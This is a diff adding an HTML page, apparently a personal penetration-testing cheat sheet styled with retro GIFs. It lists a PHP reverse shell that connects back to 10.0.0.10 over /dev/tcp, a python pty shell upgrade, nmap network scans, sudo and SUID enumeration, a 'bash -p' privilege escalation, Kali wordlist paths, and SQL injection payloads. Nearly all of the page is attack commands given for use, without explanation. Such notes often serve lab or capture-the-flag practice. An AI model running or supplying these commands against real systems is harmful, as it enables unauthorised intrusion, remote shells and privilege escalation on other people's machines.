@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unusual Trips</title>
+    <link rel="stylesheet" href="retroStyle.css">
+</head>
+<body>
+    <div class="Enclosure">
+        <img class="GIFBase" src="IMG/secrets.gif" alt="">
+
+        <h1> Reverse php Shell </h1>
+        <p class="SampleText">
+            &lt?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
+        </p>
+
+        <h1> Bash with python </h1>
+        <p class="SampleText">
+            python3 -c "import pty;pty.spawn('/bin/bash')"
+        </p>
+
+        <img class="GIFBase" src="IMG/welcome.gif" alt="">
+        <h1> Nmap </h1>
+        <p class="SampleText">
+            nmap -sn 192.168.56.0/24
+        </p>
+        <p class="SampleText">
+            nmap -p- -A 192.168.56.0
+        </p>
+
+        <h1> Enum Permission </h1>
+        <p class="SampleText">
+            sudo -l
+        </p>
+        <p class="SampleText">
+            find / -perm -4000 -type f 2> /dev/null
+        </p>
+
+        <img class="GIFBase" src="IMG/dir.gif" alt="">
+
+        <h1> Basic priv escalation </h1>
+        <p class="SampleText">
+            /bin/bash -p
+        </p>
+
+        <h1> Wordlist Kali linux location </h1>
+        <ul class="SampleText">
+            <li>/usr/share/wordlists/dirb/big.txt</li>
+            <li>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</li>
+        </ul>
+
+        <img class="GIFBase" src="IMG/opendoor.gif" alt="">
+
+        <h1> Sql injection </h1>
+        <ul class="SampleText">
+            <li>AND 0</li>
+            <li>'==</li>
+            <li>OR 1=1</li>
+            <li>' OR 'x'='x</li>
+        </ul>
+    </div>
+    
+</body>
+</html>
